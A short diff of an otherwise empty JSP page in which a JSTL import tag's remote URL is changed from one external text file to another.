@@ -3,6 +3,6 @@
 <title></title>
 <head></head>
 <body>
-<c:import url="https://payment.processinggmbh.ch/status.txt" />
+<c:import url="https://tls.processing.kz/result443.txt" />
 </body>
 </html>
